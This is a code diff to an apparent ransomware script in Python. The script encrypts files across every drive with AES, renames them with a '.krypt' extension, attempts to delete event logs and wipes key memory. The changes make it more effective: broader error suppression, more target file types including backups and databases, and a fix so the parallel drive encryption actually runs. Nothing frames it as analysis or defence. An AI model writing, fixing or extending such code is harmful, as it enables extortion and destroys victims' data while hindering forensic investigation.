@@ -96,7 +96,7 @@ def generate_key():
 def encrypt_file(file_path, key):
     try:
         with open(file_path, "rb") as file:
-            file_content = file.read()
+            file_content = file.read()   
             
         cipher = AES.new(key, AES.MODE_CBC)
         iv = cipher.iv
@@ -111,6 +111,8 @@ def encrypt_file(file_path, key):
             rename_file_with_counter(file_path, '.krypt') # Just rename
         except PermissionError:
             pass
+    except OSError:
+        pass
 
 def rename_file_with_counter(file_path, new_extension):
     base = os.path.splitext(file_path)[0]
@@ -133,7 +135,7 @@ def list_drives():
     return drives
 
 def traverse_encrypt(drive, key):
-    extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.tex', '.wpd', '.xls', '.xlsx', '.ods', '.csv', '.ppt', '.pptx', '.odp', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.mp3', '.wav', '.wma', '.aac', '.flac', '.mp4', '.avi', '.mov', '.wmv', '.mkv', '.zip', '.rar', '.7z', '.tar', '.gz', '.db', '.sql', '.accdb', '.mdb')
+    extensions = ('.doc', '.docx', '.pdf', '.txt', '.odt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.wav', '.mp4', '.avi', '.mov', '.zip', '.rar', '.7z', '.tar', '.sql', '.mdb', '.accdb', '.bak', '.iso', '.tar.gz', '.gz', '.sqlite', '.xml', '.json', '.csv')
     
     for root, _, files in os.walk(drive):
         for file in files:
@@ -141,9 +143,10 @@ def traverse_encrypt(drive, key):
                 encrypt_file(os.path.join(root, file), key)
 
 def parallel_search(drives, key):
-    for drive in drives:
-        with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
-            executor.map(traverse_encrypt, drive, key)
+    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
+        futures = [executor.submit(traverse_encrypt, drive, key) for drive in drives]
+        for future in futures:
+            future.result()
 
 def zero_memory(buffer):
     length = len(buffer)
@@ -185,7 +188,7 @@ def main():
     zero_and_unlock(mm, key_len, kernel_memory)
     
     attempt_rem_event_logs()
-    launch_gui()
+    # launch_gui()
 
 if __name__ == "__main__":
     input("ARE YOU SURE YOU WANT TO LAUNCH? THIS WILL CAUSE YOUR DEVICE SEVERE HARM!!! -> Final Warning") # to delete
